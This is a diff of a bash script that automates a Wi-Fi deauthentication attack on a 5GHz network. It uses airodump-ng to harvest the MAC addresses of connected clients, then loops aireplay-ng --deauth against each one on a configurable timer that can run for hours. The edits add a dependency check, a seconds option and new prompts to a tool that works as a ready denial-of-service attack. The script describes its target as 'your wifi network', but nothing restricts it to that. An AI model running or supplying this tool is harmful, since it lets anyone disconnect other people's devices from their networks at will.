@@ -8,6 +8,16 @@ if [[ ${UID} -ne 0 ]]; then
 exit 1
 fi
 
+for app in nmap xterm macchanger aircrack-ng ; do
+command -v $app 2>&1> /dev/null
+if [[ $? = 0 ]]; then
+echo -e "\e[92mGreat!\e[00m $app installed"
+else echo -e "\e[91m$app\e[00m not installed :("
+echo "Script will not work without $app!!"
+echo "Or will not work correctly!!"
+fi
+done
+
     enforcer5GHz () {
     for mac in $(cat realattack); do
 if [[ $mac = "Station" ]]; then
@@ -15,10 +25,11 @@ echo ""
 elif [[ $mac = "MAC" ]]; then
 echo ""
 else
-sudo xterm -e aireplay-ng --ignore-negative-one -D --deauth 40 --deauth-rc 7 -a $MYBSSID -c $mac $mon0 &
+sudo xterm -e aireplay-ng -D --deauth 40  -a $MYBSSID -c $mac $mon0 &
 fi
 done
     }
+echo
 echo "This script will deauthenticate all clients in your 5GHz wifi network"
 echo "Using a timer that will run for minutes or hours!"
 echo
@@ -66,9 +77,20 @@ echo "Next airodump-ng will launch to capture asssociated 5GHz"
 echo "clients on your network, to be validated for deauthentication"
 echo "Based on the info provided of your AP/router: $MYBSSID channel: $CH "
 echo "airodump-ng will close automatically after info is gathered."
-read -p "PRESS ENTER"
+sleep 10
 exec xterm -e airodump-ng  -c $CH --bssid $MYBSSID --output-format csv -w 5ghzstations $mon0 &
 PID=$!
+echo
+echo
+echo "Note! If you're deauthenticating your network"
+echo "for only minutes, common sense would suggest that?"
+echo "executing enforcer5GHz for longer than the actual timer/attack duration."
+sleep 10
+echo
+echo
+echo "Will not work!!"
+sleep 3
+read -p "PRESS ENTER"
 echo
 until [[ $INFO2 = [yY]* ]]; do
 echo "Deauthenticate your wifi network for:"
@@ -79,12 +101,15 @@ clear
 case $REPLY in
 h|H) read -p "How many Hours: " HOUR
 echo
-read -p "How often should enforcer5GHz launch:? [m/h] " MmHh
+read -p "Execute enforcer5GHz every:? [m/h/s] " MmHh
 case $MmHh in
 m|M) read -p "How many Minutes: " 
 START=$(( $REPLY * 60 )) ;;
 h|H) read -p "How many Hours: "
 START=$(( 60 * $REPLY * 60 ));;
+s|S) read -p "How many Seconds: "
+START=$REPLY ;;
+*) echo "Not valid use m,M,h,H" ;;
 esac
 HOURS=$(( 60 * $HOUR * 60 ))
 TIME=$HOURS
@@ -95,12 +120,15 @@ echo "clients every $START seconds for $TIME seconds!"
 
 m|M) read -p "How many Minutes: " min
 echo
-read -p "How often should enforcer5GHz launch:? [m/h] " MmHh
+read -p "Execute enforcer5GHz every:? [m/h/s] " MmHh
 case $MmHh in
 m|M) read -p "How many Minutes: " 
 START=$(( $REPLY * 60 )) ;;
 h|H) read -p "How many Hours: "
 START=$(( 60 * $REPLY * 60 ));;
+s|S) read -p "How many Seconds: "
+START=$REPLY ;;
+*) echo "Not valid use m,M,h,H" ;;
 esac
 MINUTES=$(( 60 * $min ))
 TIME=$MINUTES
@@ -123,7 +151,7 @@ cat 5ghzstations-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > realattac
 sed -i "s/time/$TIME/" timer.sh
 sleep 1
 clear
-sudo xterm -geometry 60x2 -e ./timer.sh &
+sudo xterm -geometry 60x6 -e ./timer.sh &
 sleep .5
 while true; do
 for mac in $(cat realattack); do
